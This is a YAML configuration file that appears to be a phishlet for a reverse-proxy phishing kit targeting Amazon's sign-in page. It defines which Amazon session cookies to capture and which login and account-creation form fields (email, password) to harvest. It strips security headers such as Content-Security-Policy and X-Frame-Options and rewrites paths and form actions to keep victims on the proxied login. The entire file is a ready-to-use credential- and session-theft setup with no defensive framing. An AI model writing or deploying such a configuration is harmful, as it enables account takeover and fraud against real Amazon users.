name: "Amazon-Login"
author: "Vanta v5"
min_ver: "5.0.0"
proxy_hosts:
  - subdomain: "amazon"
    target: "www.amazon.com"
auth_urls: ["/ap/signin"]
landing_path: ["/ap/signin"]
auth_tokens:
  - {type: "cookie", name: "x-main"}
  - {type: "cookie", name: "at-main"}
  - {type: "cookie", name: "sess-at-main"}
  - {type: "cookie", name: "ubid-main"}
credentials:
  - {type: "post_param", name: "email", regex: null}
  - {type: "post_param", name: "password", regex: null}
  - {type: "post_param", name: "create_account_email", regex: null}
  - {type: "post_param", name: "create_account_password", regex: null}
injections: []
headers:
  - {action: "remove", name: "Content-Security-Policy"}
  - {action: "remove", name: "X-Frame-Options"}
  - {action: "remove", name: "X-Content-Type-Options"}
path_rewrites:
  - {pattern: "^/$", replace: "/ap/signin", methods: ["GET"]}
cookie_rewrites: []
blocklist:
  - {pattern: "images|/ads|/tagging|analytics|/js/external/", mimes: ["image/", "text/javascript"], max_kb: 512}
form_actions:
  - {selector: "form[action*=\"signin\"]", action_to: "/ap/session"}
